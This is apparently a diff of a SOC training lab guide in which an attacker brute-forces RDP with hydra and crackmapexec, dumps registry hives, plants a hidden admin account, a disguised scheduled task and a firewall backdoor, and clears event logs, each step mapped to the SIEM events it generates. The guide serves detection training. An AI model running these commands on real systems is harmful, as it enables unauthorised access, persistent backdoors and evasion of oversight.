@@ -8,7 +8,7 @@ This scenario demonstrates a realistic situation where:
 - Passwords are stronger (user changed to a personal OSINT-based password)  
 - BUT the SOC still does **not respond** to alerts  
 
-The attacker performs an OSINT-based password attack, gains access, runs more advanced post-exploitation steps, attempts persistence, performs partial cleanup, and leaves — while the SIEM logs everything, but the SOC ignores it.
+The attacker performs an OSINT-based password attack, gains access, runs advanced post-exploitation steps, establishes a hidden backdoor for future attacks, performs partial cleanup, and leaves — while the SIEM logs everything, but the SOC ignores it.
 
 ---
 
@@ -109,226 +109,255 @@ Name: `scenario2_start_kali`
 
 ## 3.1 Username Enumeration (From Kali)
 
-Test which username is valid via RDP protocol handshake:
-
-\`\`\`bash
+```bash
 for user in $(cat usernames.txt); do
     xfreerdp /v:<WINDOWS_IP> /u:$user /p:RandomPassword123 /cert:ignore
 done
-\`\`\`
+```
 
 Expected:
 - Incorrect username → immediate failure  
 - Correct username → different failure timing  
 
 **Screenshot:**  
-➡️ Terminal showing at least one username behaving differently  
-(e.g., valid username: `akovacs`)
+➡️ Terminal showing the valid username (e.g., `akovacs`)
 
 ---
 
 ## 3.2 OSINT-Based Password Brute Force
 
-\`\`\`bash
+```bash
 hydra -L usernames.txt -P osint_passwords.txt rdp://<WINDOWS_IP>
-\`\`\`
+```
 
-OR CME:
+OR using CME:
 
-\`\`\`bash
+```bash
 crackmapexec rdp <WINDOWS_IP> -u usernames.txt -p osint_passwords.txt
-\`\`\`
+```
 
-Expected:
+**Expected:**
 - SIEM logs many 4625 failed attempts  
 - Eventually → successful login for one user  
 
 **Screenshot:**  
-➡️ Hydra or CME success message  
-➡️ Wazuh alert list showing multiple failed logon attempts
+➡️ Hydra/CME success output  
+➡️ Wazuh showing failed auth spam
 
 ---
 
-# 🟧 4. RDP Login — Attack Execution
+# 🟧 4. RDP Login — Access Achieved
 
-\`\`\`bash
+```bash
 xfreerdp /v:<WINDOWS_IP> /u:<VALID_USERNAME> /p:<OSINT_PASSWORD> /cert:ignore
-\`\`\`
+```
 
 **Screenshot:**  
-➡️ Windows desktop after login
+➡️ Logged-in Windows Server desktop
 
 ---
 
 # 🟦 5. On-System Actions (Advanced Attacker Activity)
 
-Run everything inside RDP.
+Run inside the RDP session.
 
 ---
 
 ## 5.1 Basic Recon
 
-\`\`\`powershell
+```powershell
 whoami
 hostname
 systeminfo
-\`\`\`
+```
 
-**Screenshot:**  
-➡️ Combined output
-
-SIEM visibility:
-- 4688 process creation  
+**SIEM visibility:**  
+- 4688 (process creation)  
 - Sysmon ID 1 events  
+
+**Screenshot:** combined output
 
 ---
 
 ## 5.2 Local User Enumeration
 
-\`\`\`powershell
+```powershell
 net user
 Get-LocalUser
-\`\`\`
+```
 
 ---
 
 ## 5.3 PowerShell Recon
 
-\`\`\`powershell
+```powershell
 Get-ChildItem C:\Users
 Get-Process
 Get-Service
-\`\`\`
+```
 
-PowerShell scriptblock logging will create Event ID 4104.
+Produces PowerShell ScriptBlock logs (4104).
 
 ---
 
 # 🟥 6. Credential Exploration Attempts
 
-## 6.1 Registry Dump Attempt (SAM / SYSTEM)
+## Registry dump attempt (SAM / SYSTEM)
 
-\`\`\`powershell
-reg save HKLM\\SAM C:\\temp\\sam.save
-reg save HKLM\\SYSTEM C:\\temp\\system.save
-\`\`\`
+```powershell
+reg save HKLM\SAM C:\temp\sam.save
+reg save HKLM\SYSTEM C:\temp\system.save
+```
 
 Expected:
-- Operation **fails** due to access restrictions  
-- Sysmon logs Event ID 11 (file create attempt)
+- Access denied  
+- Sysmon ID 11 visibility  
 
 **Screenshot:**  
 ➡️ PowerShell error + Sysmon event
 
 ---
 
-# 🟦 7. Persistence Attempt — Scheduled Task
+# 🟦 7. Network Discovery
 
-Create a simple persistence backdoor simulation:
-
-\`\`\`powershell
-schtasks /create /tn "Updater" /sc onlogon /tr "powershell.exe -nop -w hidden -c whoami"
-\`\`\`
-
-Wazuh / Sysmon visibility:
-- 4698: Scheduled task created  
-- Sysmon ID 1: powershell.exe invocation  
-- PowerShell 4104 logs creation command
-
-**Screenshot:**  
-➡️ Task Scheduler → shows "Updater"  
-➡️ Wazuh → new task creation event
-
----
-
-# 🟧 8. Network Discovery
-
-\`\`\`powershell
+```powershell
 test-connection <KALI_IP>
 net view
 ipconfig /all
-\`\`\`
+```
 
-SIEM sees:
-- Sysmon ID 3 events  
-- Network scans appear in logs  
+SIEM will log:
+- Sysmon ID 3 (network connections)  
+- Possible suspicious recon patterns  
 
 ---
 
-# 🟪 9. Cleanup Attempts
+# 🟪 8. Persistence Backdoor (Stealth) — **Critical for Scenario 3**
+
+Before leaving, the attacker silently plants a **long-term persistence mechanism**  
+that will be reused in Scenario 3.
+
+---
+
+## 8.1 Create a Hidden Administrator Account
+
+```powershell
+net user backupadmin Winter2024! /add
+net localgroup Administrators backupadmin /add
+```
+
+Why SOC misses it:
+- No alerting rule for:
+  - 4720 (user created)  
+  - 4732 (user added to Administrators)  
+- “backupadmin” appears legitimate  
+- Analysts are not reviewing logs
+
+**Screenshot (optional):**  
+➡️ `net user` showing new account  
+➡️ Wazuh events ignored
+
+---
+
+## 8.2 Create a Fake Administrative Scheduled Task
+
+```powershell
+schtasks /create /tn "SystemBackupTask" /tr "cmd.exe /c exit" /sc weekly /ru backupadmin
+```
+
+This:
+- Looks like a routine IT job  
+- Executes harmlessly  
+- Generates logs, but SOC ignores them
+
+---
+
+## 8.3 Optional Network Backdoor
+
+```powershell
+netsh advfirewall firewall add rule name="Backup WinRM" dir=in action=allow protocol=TCP localport=5987
+```
+
+Provides:
+- An alternative entry point  
+- Zero alerts due to lack of monitoring  
+
+---
+
+# 🟪 Summary of Persistence Left Behind
+
+| Backdoor | Details |
+|---------|---------|
+| Hidden admin user | `backupadmin` / `Winter2024!` |
+| Scheduled task | `SystemBackupTask` |
+| Optional firewall rule | Port 5987 open |
+| SOC reaction | None |
+
+This sets the foundation for **Scenario 3**,  
+where the attacker will try to return using this stealth backdoor.
+
+---
+
+# 🟫 9. Cleanup Attempts
 
 ## 9.1 PowerShell History Removal
 
-\`\`\`powershell
+```powershell
 Remove-Item (Get-PSReadlineOption).HistorySavePath
-\`\`\`
+```
 
-## 9.2 Scheduled Task Deletion
+---
 
-\`\`\`powershell
-schtasks /delete /tn "Updater" /f
-\`\`\`
+## 9.2 Event Log Clear Attempt
 
-## 9.3 Event Log Clear Attempt
-
-\`\`\`powershell
+```powershell
 wevtutil cl Security
-\`\`\`
+```
 
-Expected:
-- SIEM HIGH alert: Security log was cleared  
-- SOC analyst → **still does nothing**
-
-**Screenshot:**  
-➡️ Wazuh alert “Log cleared”  
-➡️ PowerShell output
+**Expected:**  
+- HIGH alert in SIEM  
+- SOC **still ignores it**
 
 ---
 
 # 🚪 10. Attacker Exit
 
-\`\`\`powershell
+```powershell
 logoff
-\`\`\`
+```
 
 ---
 
 # 🟦 11. What the SIEM Saw
 
-### ✔ Correct username attempts  
-### ✔ Many failed logons (4625)  
-### ✔ Successful logon (4624)  
-### ✔ Process creation (4688)  
-### ✔ ScriptBlock logging (4104)  
-### ✔ Scheduled Task creation (4698)  
-### ✔ Registry access attempts  
-### ✔ Log clearing attempt alert  
+### ✔ Username enumeration  
+### ✔ OSINT password spray  
+### ✔ Successful logon  
+### ✔ Reconnaisance commands  
+### ✔ PowerShell scriptblock logs  
+### ✔ Scheduled task creation  
+### ✔ New local admin user (ignored)  
+### ✔ Firewall modification (ignored)  
+### ✔ Log clearing attempt  
 
-### ❌ What the SOC Did  
-**Nothing.**  
-No escalation, no ticket, no reaction.
-
-**Screenshot:**  
-➡️ Wazuh dashboard showing alerts  
-➡️ Alert levels  
-➡️ MITRE mapping
+### ❌ SOC Response  
+**No action taken. No escalation.**
 
 ---
 
-# 🟦 12. Lessons Learned (Narrative)
+# 🟦 12. Lessons Learned
 
-The company realizes:
+The company realizes the need for:
 
-- Good logs do not equal good security  
-- SOC analysts need training  
-- They need detection engineering playbooks  
-- Password spraying / RDP attack detection rules must be created  
-- Behavioral detection tuning is required  
-- Scheduled task creation must generate alerts  
-- Log clearing → immediate SOC escalation  
+- User creation alerts  
+- Admin group change detection  
+- Firewall modification monitoring  
+- Scheduled task detection rules  
+- SOC playbooks  
+- Better analyst training  
 
-This sets the stage for **Scenario 3**,  
-where the attacker escalates to phishing and credential theft.
+This directly leads into **Scenario 3**,  
+where the SOC will finally detect malicious activity quickly.
 
 ---
 
@@ -337,4 +366,3 @@ where the attacker escalates to phishing and credential theft.
 
 - Windows → `scenario2_end_windows`  
 - Kali → `scenario2_end_kali`
-
